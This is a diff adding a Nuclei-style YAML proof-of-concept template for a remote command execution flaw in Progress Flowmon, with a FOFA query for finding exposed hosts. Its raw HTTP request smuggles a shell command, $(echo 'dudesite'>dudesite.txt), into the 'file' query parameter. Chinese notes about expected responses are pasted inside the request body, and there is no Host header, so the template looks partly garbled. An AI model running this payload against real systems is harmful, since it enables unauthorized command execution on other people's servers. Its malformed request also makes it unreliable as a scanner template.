@@ -1,0 +1,43 @@
+id: poc-va4bsfnx90441w99
+info:
+  name: ProgressFlowmon  远程命令执行
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/va4bsfnx90441w99'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: va4bsfnx90441w99
+    fofa: body="/css/themes/flowmon/"
+http:
+- raw:
+  - 'GET /service.pdfs/confluence?lang=en&file=$(echo+''dudesite''>dudesite.txt) HTTP/1.1
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept: */*
+
+
+    Connection: close
+
+
+    # 响应代码特征
+
+    403
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 403
+    type: status
